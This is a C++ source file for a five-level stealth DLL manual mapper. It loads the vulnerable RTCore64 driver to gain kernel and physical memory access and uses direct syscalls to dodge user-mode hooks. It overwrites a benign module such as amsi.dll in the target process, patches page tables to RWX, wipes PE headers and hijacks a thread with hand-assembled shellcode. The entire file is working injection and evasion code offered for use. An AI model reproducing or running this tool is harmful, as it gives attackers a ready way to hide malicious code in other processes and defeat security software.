// mapper_v5.cpp — kernel-assisted manual mapper with 5 stages of stealth.
//
// level 1 — direct syscalls (SSNs from on-disk ntdll.dll)
// level 2 — thread hijacking (no CreateRemoteThread, no OpenProcess)
// level 3 — PE header wipe + no LDR entry (manual-map inherently)
// level 4 — module stomping onto a benign image VAD in target
// level 5 — all memory writes to target go through RTCore64 physical mapping;
//           PTEs patched to R/W/X on the stomped region; TLB refilled by the
//           suspend/resume that already happens in the hijack.
//
// build: cl /std:c++17 /W4 /permissive- /EHsc /O2 /DUNICODE /D_UNICODE ^
//           mapper_v5.cpp /link advapi32.lib
// usage: mapper_v5.exe <pid> <dll_path> [--driver RTCore64.sys] [--stomp dll]
//
#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#include <windows.h>
#include <winternl.h>
#include <cinttypes>
#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <cwchar>
#include <memory>
#include <string>
#include <unordered_map>
#include <unordered_set>
#include <vector>

#include "offsets.h"
#include "syscalls.h"
#include "rtcore.h"
#include "kmem.h"
#include "pe.h"

// ======================================================================
// hijack shellcode — saves volatile regs + xmm0-5, calls DllMain, restores,
// jumps to the original RIP. Imm64s patched at write-time.
// Layout matches generator below (byte-for-byte).
// ======================================================================
static constexpr std::size_t kHijackScSize = 160;

static std::size_t emit_hijack_shellcode(std::uint8_t* out,
                                         std::uint64_t image_base,
                                         std::uint64_t entry_va,
                                         std::uint64_t orig_rip)
{
    std::size_t p = 0;
    auto E1 = [&](std::uint8_t b) { out[p++] = b; };
    auto Ebuf = [&](const std::uint8_t* b, std::size_t n) {
        std::memcpy(out + p, b, n); p += n;
    };
    auto Eimm64 = [&](std::uint64_t v) {
        std::memcpy(out + p, &v, 8); p += 8;
    };

    // save volatile GPRs + flags
    E1(0x50);                                 // push rax
    E1(0x51);                                 // push rcx
    E1(0x52);                                 // push rdx
    E1(0x41); E1(0x50);                       // push r8
    E1(0x41); E1(0x51);                       // push r9
    E1(0x41); E1(0x52);                       // push r10
    E1(0x41); E1(0x53);                       // push r11
    E1(0x9C);                                 // pushfq

    // sub rsp, 20h + 10h*6 = 0x80 (shadow + xmm0..5 save)
    const std::uint8_t sub80[] = { 0x48, 0x81, 0xEC, 0x80, 0x00, 0x00, 0x00 };
    Ebuf(sub80, sizeof(sub80));
    // movdqu [rsp+20h + N*10h], xmmN  for N=0..5
    for (int n = 0; n < 6; ++n) {
        std::uint8_t disp = static_cast<std::uint8_t>(0x20 + n * 0x10);
        E1(0xF3); E1(0x0F); E1(0x7F);
        E1(static_cast<std::uint8_t>(0x44 | (n << 3))); // mod=01 rm=100(sib)
        E1(0x24);                                       // sib=rsp
        E1(disp);
    }

    // mov rcx, image_base
    E1(0x48); E1(0xB9); Eimm64(image_base);
    // mov edx, 1  (DLL_PROCESS_ATTACH)
    E1(0xBA); E1(0x01); E1(0x00); E1(0x00); E1(0x00);
    // xor r8, r8
    E1(0x4D); E1(0x31); E1(0xC0);
    // mov rax, entry_va
    E1(0x48); E1(0xB8); Eimm64(entry_va);
    // call rax
    E1(0xFF); E1(0xD0);

    // restore xmm0..5
    for (int n = 0; n < 6; ++n) {
        std::uint8_t disp = static_cast<std::uint8_t>(0x20 + n * 0x10);
        E1(0xF3); E1(0x0F); E1(0x6F);
        E1(static_cast<std::uint8_t>(0x44 | (n << 3)));
        E1(0x24);
        E1(disp);
    }
    // add rsp, 0x80
    const std::uint8_t add80[] = { 0x48, 0x81, 0xC4, 0x80, 0x00, 0x00, 0x00 };
    Ebuf(add80, sizeof(add80));
    // popfq
    E1(0x9D);
    // pop r11..rax (reverse of save)
    E1(0x41); E1(0x5B);   // pop r11
    E1(0x41); E1(0x5A);   // pop r10
    E1(0x41); E1(0x59);   // pop r9
    E1(0x41); E1(0x58);   // pop r8
    E1(0x5A);             // pop rdx
    E1(0x59);             // pop rcx
    E1(0x58);             // pop rax
    // mov rax, orig_rip
    E1(0x48); E1(0xB8); Eimm64(orig_rip);
    // jmp rax
    E1(0xFF); E1(0xE0);

    // zero-fill tail up to kHijackScSize
    while (p < kHijackScSize) E1(0x90);
    return p;
}

// ======================================================================
// PTE patching — walk target's page tables physically, flip P/RW, clear NX.
// ======================================================================
static bool make_rwx(rt::Driver& d, std::uint64_t cr3_phys, std::uint64_t va) {
    std::uint64_t pml4e_i = (va >> 39) & 0x1FF;
    std::uint64_t pdpte_i = (va >> 30) & 0x1FF;
    std::uint64_t pde_i   = (va >> 21) & 0x1FF;
    std::uint64_t pte_i   = (va >> 12) & 0x1FF;

    std::uint64_t pml4_base = cr3_phys & ~0xFFFULL;
    std::uint64_t pml4e = 0;
    if (!d.phys_read(pml4_base + pml4e_i * 8, &pml4e, 8) || !(pml4e & 1)) return false;

    std::uint64_t pdpt_base = pml4e & 0x000FFFFFFFFFF000ULL;
    std::uint64_t pdpte = 0;
    if (!d.phys_read(pdpt_base + pdpte_i * 8, &pdpte, 8) || !(pdpte & 1)) return false;
    if (pdpte & (1ULL << 7)) {
        std::uint64_t nv = (pdpte | 0x3) & ~(1ULL << 63);
        return d.phys_write(pdpt_base + pdpte_i * 8, &nv, 8);
    }

    std::uint64_t pd_base = pdpte & 0x000FFFFFFFFFF000ULL;
    std::uint64_t pde = 0;
    if (!d.phys_read(pd_base + pde_i * 8, &pde, 8) || !(pde & 1)) return false;
    if (pde & (1ULL << 7)) {
        std::uint64_t nv = (pde | 0x3) & ~(1ULL << 63);
        return d.phys_write(pd_base + pde_i * 8, &nv, 8);
    }

    std::uint64_t pt_base = pde & 0x000FFFFFFFFFF000ULL;
    std::uint64_t pte = 0;
    if (!d.phys_read(pt_base + pte_i * 8, &pte, 8) || !(pte & 1)) return false;
    std::uint64_t nv = (pte | 0x3) & ~(1ULL << 63);
    return d.phys_write(pt_base + pte_i * 8, &nv, 8);
}

// ======================================================================
// module-stomping — pick a loaded image VAD in target that's big enough
// and matches a benign whitelist (or user-provided override).
// ======================================================================
static const std::unordered_set<std::string>& default_stomp_whitelist() {
    static const std::unordered_set<std::string> s = {
        "cryptbase.dll",
        "winsta.dll",
        "version.dll",
        "dxgidebug.dll",
        "uxtheme.dll",
        "mscms.dll",
        "amsi.dll",
        "wtsapi32.dll",
    };
    return s;
}

static bool pick_stomp(const std::vector<km::VadRow>& vads,
                       std::size_t needed_bytes,
                       const std::string& override_name,
                       km::VadRow& out)
{
    const auto& wl = default_stomp_whitelist();
    for (const auto& r : vads) {
        if (r.type != ko::VadImageMap) continue;
        if (r.file.empty()) continue;
        if (r.end <= r.start) continue;
        if (r.end - r.start < needed_bytes) continue;
        if (!override_name.empty()) {
            if (r.file == override_name) { out = r; return true; }
            continue;
        }
        if (wl.count(r.file)) { out = r; return true; }
    }
    return false;
}

// ======================================================================
// module-map — walk target VADs to build { basename -> remote_base }.
// basename is lowercased.
// ======================================================================
static std::unordered_map<std::string, std::uint64_t>
build_module_map(const std::vector<km::VadRow>& vads)
{
    std::unordered_map<std::string, std::uint64_t> m;
    for (const auto& r : vads) {
        if (r.type != ko::VadImageMap) continue;
        if (r.file.empty()) continue;
        // only first (lowest VA) per basename — that's the module header
        if (m.find(r.file) == m.end()) {
            m[r.file] = r.start;
        } else if (r.start < m[r.file]) {
            m[r.file] = r.start;
        }
    }
    return m;
}

// ======================================================================
// thread discovery — NtQuerySystemInformation(SystemProcessInformation).
// Returns TIDs of threads in `target_pid`, skipping the main thread (first).
// ======================================================================
static bool enumerate_threads(DWORD target_pid, std::vector<DWORD>& tids_out) {
    tids_out.clear();
    using pfnNQSI = NTSTATUS (NTAPI*)(ULONG, PVOID, ULONG, PULONG);
    auto nqsi = reinterpret_cast<pfnNQSI>(
        ::GetProcAddress(::GetModuleHandleW(L"ntdll.dll"), "NtQuerySystemInformation"));
    if (!nqsi) return false;

    ULONG need = 0x10000;
    std::vector<unsigned char> buf;
    for (int i = 0; i < 6; ++i) {
        buf.resize(need);
        ULONG got = 0;
        NTSTATUS st = nqsi(kSystemProcessInformation, buf.data(), need, &got);
        if (st == 0) { need = got; break; }
        if (st == static_cast<NTSTATUS>(0xC0000004L) /*STATUS_INFO_LENGTH_MISMATCH*/) {
            need = (got ? got : need) + 0x8000;
            continue;
        }
        return false;
    }

    std::size_t off = 0;
    while (true) {
        auto* e = reinterpret_cast<SYSTEM_PROCESS_INFORMATION_T*>(buf.data() + off);
        if (reinterpret_cast<std::uint64_t>(e->UniqueProcessId) == target_pid) {
            for (ULONG t = 0; t < e->NumberOfThreads; ++t) {
                DWORD tid = static_cast<DWORD>(
                    reinterpret_cast<std::uint64_t>(e->Threads[t].ClientId.UniqueThread));
                if (tid) tids_out.push_back(tid);
            }
            return !tids_out.empty();
        }
        if (e->NextEntryOffset == 0) break;
        off += e->NextEntryOffset;
    }
    return false;
}

// ======================================================================
// elevate SeDebugPrivilege (nice-to-have; some paths work without it)
// ======================================================================
static void try_enable_debug_priv() {
    HANDLE tok = nullptr;
    if (!::OpenProcessToken(::GetCurrentProcess(),
                            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &tok)) return;
    TOKEN_PRIVILEGES tp{};
    tp.PrivilegeCount = 1;
    if (::LookupPrivilegeValueW(nullptr, SE_DEBUG_NAME, &tp.Privileges[0].Luid)) {
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        ::AdjustTokenPrivileges(tok, FALSE, &tp, sizeof(tp), nullptr, nullptr);
    }
    ::CloseHandle(tok);
}

// ======================================================================
// default driver path = exe-dir + RTCore64.sys
// ======================================================================
static std::wstring default_driver_path() {
    wchar_t buf[MAX_PATH]{};
    DWORD n = ::GetModuleFileNameW(nullptr, buf, MAX_PATH);
    if (n == 0) return L"RTCore64.sys";
    wchar_t* p = std::wcsrchr(buf, L'\\');
    if (p) *(p + 1) = 0;
    return std::wstring(buf) + L"RTCore64.sys";
}

static void usage() {
    std::fprintf(stderr,
        "mapper_v5.exe <pid> <dll_path> [--driver path] [--stomp name.dll]\n"
        "  level-1..5 manual mapper. requires elevation.\n"
        "  --stomp overrides the default stompee whitelist.\n");
}

// ======================================================================
// entry
// ======================================================================
int wmain(int argc, wchar_t** argv) {
    if (argc < 3) { usage(); return 2; }

    DWORD target_pid = 0;
    {
        wchar_t* end = nullptr;
        unsigned long v = std::wcstoul(argv[1], &end, 0);
        if (!end || *end != 0 || v == 0) { usage(); return 2; }
        target_pid = static_cast<DWORD>(v);
    }
    const wchar_t* dll_path = argv[2];

    std::wstring driver = default_driver_path();
    std::string  stomp_override;
    for (int i = 3; i < argc; ++i) {
        if (std::wcscmp(argv[i], L"--driver") == 0 && i + 1 < argc) {
            driver = argv[++i];
        } else if (std::wcscmp(argv[i], L"--stomp") == 0 && i + 1 < argc) {
            wchar_t* w = argv[++i];
            int n = ::WideCharToMultiByte(CP_UTF8, 0, w, -1, nullptr, 0, nullptr, nullptr);
            if (n > 0) {
                stomp_override.resize(static_cast<std::size_t>(n - 1));
                ::WideCharToMultiByte(CP_UTF8, 0, w, -1,
                                      stomp_override.data(), n, nullptr, nullptr);
                for (auto& c : stomp_override)
                    c = static_cast<char>(::tolower((unsigned char)c));
            }
        }
    }

    try_enable_debug_priv();

    // ---- read DLL off disk, validate, lay out ------------------------------
    std::vector<std::uint8_t> file;
    if (!pe::read_file(dll_path, file)) {
        std::fprintf(stderr, "[-] read dll failed: %lu\n", ::GetLastError()); return 1;
    }
    auto* file_nt = pe::validate(file);
    if (!file_nt) { std::fprintf(stderr, "[-] bad PE\n"); return 1; }
    std::vector<std::uint8_t> img = pe::layout(file, file_nt);
    auto* dos    = reinterpret_cast<IMAGE_DOS_HEADER*>(img.data());
    auto* nt     = reinterpret_cast<IMAGE_NT_HEADERS64*>(img.data() + dos->e_lfanew);
    const DWORD  image_size = nt->OptionalHeader.SizeOfImage;
    const DWORD  hdr_size   = nt->OptionalHeader.SizeOfHeaders;
    std::printf("[+] dll: 0x%x bytes mapped (headers 0x%x)\n", image_size, hdr_size);

    // ---- init direct syscalls (level 1) ------------------------------------
    Syscalls sc;
    if (!sc.init()) { std::fprintf(stderr, "[-] syscall init failed\n"); return 1; }
    std::printf("[+] L1: syscalls parsed, %zu SSNs from ntdll.dll on disk\n", sc.ssn_count());

    auto fNtOpenThread      = sc.get<tNtOpenThread>("NtOpenThread");
    auto fNtClose           = sc.get<tNtClose>("NtClose");
    auto fNtSuspendThread   = sc.get<tNtSuspendThread>("NtSuspendThread");
    auto fNtResumeThread    = sc.get<tNtResumeThread>("NtResumeThread");
    auto fNtGetContext      = sc.get<tNtGetContextThread>("NtGetContextThread");
    auto fNtSetContext      = sc.get<tNtSetContextThread>("NtSetContextThread");
    if (!fNtOpenThread || !fNtClose || !fNtSuspendThread || !fNtResumeThread
        || !fNtGetContext || !fNtSetContext) {
        std::fprintf(stderr, "[-] missing syscall stubs for hijack\n"); return 1;
    }
    sc.finalize();

    // ---- install + open RTCore64 -------------------------------------------
    if (!rt::install_start(driver)) { rt::stop_delete(); return 1; }
    struct DrvGuard { ~DrvGuard() { rt::stop_delete(); } } drv_guard;
    rt::Driver rtc;
    if (!rtc.open()) { std::fprintf(stderr, "[-] open \\\\.\\RTCore64\n"); return 1; }
    std::printf("[+] RTCore64 up\n");

    // ---- locate ntoskrnl + PsInitialSystemProcess ---------------------------
    std::uint64_t ntos_base = 0;
    std::wstring  ntos_path;
    if (!km::get_ntoskrnl_info(ntos_base, ntos_path)) {
        std::fprintf(stderr, "[-] ntoskrnl lookup failed\n"); return 1;
    }
    ULONG rva_pisp = 0;
    if (!km::find_export_rva(ntos_path.c_str(), "PsInitialSystemProcess", rva_pisp)) {
        std::fprintf(stderr, "[-] PsInitialSystemProcess RVA failed\n"); return 1;
    }
    const std::uint64_t pisp_va = ntos_base + rva_pisp;
    std::fprintf(stderr, "[dbg] PsInitialSystemProcess rva=0x%lx va=0x%016" PRIx64 "\n",
                 rva_pisp, pisp_va);
    std::uint64_t sys_eproc = 0;
    bool read_ok = rtc.kv_u64(pisp_va, sys_eproc);
    std::fprintf(stderr, "[dbg] read ok=%d sys_eproc=0x%016" PRIx64 " (GLE=%lu)\n",
                 int(read_ok), sys_eproc, ::GetLastError());
    if (!read_ok || sys_eproc == 0) {
        // last-chance test: read 8 bytes at ntos_base itself (should be MZ signature in low bytes)
        std::uint64_t probe = 0;
        bool p_ok = rtc.kv_u64(ntos_base, probe);
        std::fprintf(stderr, "[dbg] probe base ok=%d val=0x%016" PRIx64
                             " (expect MZ=0x..5A4D)\n", int(p_ok), probe);
        std::fprintf(stderr, "[-] PsInitialSystemProcess read failed\n");
        return 1;
    }

    // ---- find target EPROCESS + CR3 ----------------------------------------
    std::uint64_t t_eproc = 0;
    if (!km::find_eprocess(rtc, sys_eproc, target_pid, t_eproc)) {
        std::fprintf(stderr, "[-] pid %lu not found in ActiveProcessLinks\n", target_pid);
        return 1;
    }
    std::uint64_t cr3 = 0;
    if (!rtc.kv_u64(t_eproc + ko::EP_DirectoryTableBase, cr3) || cr3 == 0) {
        std::fprintf(stderr, "[-] DirectoryTableBase read failed\n"); return 1;
    }
    std::printf("[+] target: EPROCESS=0x%016" PRIx64 "  CR3=0x%016" PRIx64 "\n",
                t_eproc, cr3);

    // ---- VAD walk + module map (level-4 stomp candidate) --------------------
    std::vector<km::VadRow> vads;
    if (!km::walk_vads(rtc, t_eproc, vads)) {
        std::fprintf(stderr, "[-] VAD walk failed (offsets drift?)\n"); return 1;
    }
    std::printf("[+] VAD nodes: %zu\n", vads.size());

    std::unordered_map<std::string, std::uint64_t> modmap = build_module_map(vads);
    std::printf("[+] modules in target: %zu\n", modmap.size());

    // ---- pick stompee -------------------------------------------------------
    const std::size_t needed = image_size + kHijackScSize + 0x200;
    km::VadRow stompee{};
    if (!pick_stomp(vads, needed, stomp_override, stompee)) {
        std::fprintf(stderr,
            "[-] L4: no stompable module >= 0x%zx bytes%s\n", needed,
            stomp_override.empty() ? " in default whitelist"
                                   : " matching --stomp override");
        return 1;
    }
    const std::uint64_t remote_base = stompee.start;
    const std::uint64_t stompee_sz  = stompee.end - stompee.start;
    std::printf("[+] L4: stomping %s @ 0x%016" PRIx64 " (0x%" PRIx64 " bytes)\n",
                stompee.file.c_str(), remote_base, stompee_sz);

    // ---- resolve imports against VAD-derived module bases -------------------
    if (!pe::resolve_imports(img.data(), nt, modmap)) {
        std::fprintf(stderr, "[-] import resolution failed\n"); return 1;
    }

    // ---- apply relocs for the chosen base -----------------------------------
    pe::relocate(img.data(), nt, remote_base);

    // ---- level-3: wipe PE header bytes in the local buffer before shipping --
    std::memset(img.data(), 0, hdr_size);

    // ---- build the hijack shellcode (lives at end of stomped region) --------
    const std::uint64_t sc_va  = remote_base + image_size;
    // entry_rva is still valid inside img; relocations don't touch AddressOfEntryPoint
    const std::uint64_t ep_va  = remote_base + file_nt->OptionalHeader.AddressOfEntryPoint;
    // orig_rip is patched after we snapshot CONTEXT; place placeholder, patch later
    // in-shellcode offset of orig_rip imm64: stored and patched below.

    // ---- level-5: PTE flip the entire stomped region to R/W/X ---------------
    std::uint64_t flipped_pages = 0;
    for (std::uint64_t pg = remote_base; pg < remote_base + image_size + kHijackScSize;
         pg += 0x1000)
    {
        if (make_rwx(rtc, cr3, pg)) flipped_pages++;
    }
    std::printf("[+] L5: PTEs flipped RWX: %" PRIu64 " pages\n", flipped_pages);
    if (flipped_pages == 0) {
        std::fprintf(stderr, "[-] L5: PTE walk failed for every page; aborting\n");
        return 1;
    }

    // ---- level-5: write the image into target via phys mapping --------------
    if (!km::write_target_virt(rtc, cr3, remote_base, img.data(), image_size)) {
        std::fprintf(stderr, "[-] L5: image write failed\n"); return 1;
    }
    std::printf("[+] L5: image written to target via phys mapping\n");

    // ---- pick a thread to hijack (level 2) ----------------------------------
    std::vector<DWORD> tids;
    if (!enumerate_threads(target_pid, tids) || tids.size() < 2) {
        std::fprintf(stderr, "[-] L2: thread enumeration empty / too few\n");
        return 1;
    }
    // skip first (main thread is heavy-watched); pick last-created-ish
    DWORD victim_tid = tids.back();
    std::printf("[+] L2: hijacking TID %lu (of %zu)\n", victim_tid, tids.size());

    // open thread via direct syscall
    HANDLE hth = nullptr;
    {
        OBJECT_ATTRIBUTES_T oa; init_oa(oa);
        CLIENT_ID_T cid{};
        cid.UniqueThread = reinterpret_cast<HANDLE>(
            static_cast<std::uintptr_t>(victim_tid));
        NTSTATUS st = fNtOpenThread(&hth, THREAD_ALL_ACCESS, &oa, &cid);
        if (st < 0 || !hth) {
            std::fprintf(stderr, "[-] L2: NtOpenThread status=0x%lX\n", st); return 1;
        }
    }

    ULONG prev = 0;
    if (fNtSuspendThread(hth, &prev) < 0) {
        std::fprintf(stderr, "[-] L2: NtSuspendThread failed\n");
        fNtClose(hth); return 1;
    }

    CONTEXT ctx{};
    ctx.ContextFlags = CONTEXT_FULL;
    if (fNtGetContext(hth, &ctx) < 0) {
        std::fprintf(stderr, "[-] L2: NtGetContextThread failed\n");
        fNtResumeThread(hth, &prev); fNtClose(hth); return 1;
    }
    const std::uint64_t orig_rip = ctx.Rip;

    // emit the shellcode now that we know orig_rip
    std::uint8_t shell[kHijackScSize];
    std::memset(shell, 0x90, sizeof(shell));
    emit_hijack_shellcode(shell, remote_base, ep_va, orig_rip);

    if (!km::write_target_virt(rtc, cr3, sc_va, shell, sizeof(shell))) {
        std::fprintf(stderr, "[-] L5: hijack shellcode write failed\n");
        fNtResumeThread(hth, &prev); fNtClose(hth); return 1;
    }
    std::printf("[+] L5: hijack shellcode written @ 0x%016" PRIx64 "\n", sc_va);

    // patch RIP + resume
    ctx.Rip = sc_va;
    ctx.ContextFlags = CONTEXT_CONTROL;
    if (fNtSetContext(hth, &ctx) < 0) {
        std::fprintf(stderr, "[-] L2: NtSetContextThread failed\n");
        fNtResumeThread(hth, &prev); fNtClose(hth); return 1;
    }
    if (fNtResumeThread(hth, &prev) < 0) {
        std::fprintf(stderr, "[-] L2: NtResumeThread failed\n");
        fNtClose(hth); return 1;
    }
    fNtClose(hth);

    std::printf("[+] mapped 0x%016" PRIx64 "  entry=0x%016" PRIx64 "  via %s\n",
                remote_base, ep_va, stompee.file.c_str());
    std::printf("[+] L3: PE header zeroed in local buffer (written as zeros)\n");
    return 0;
}
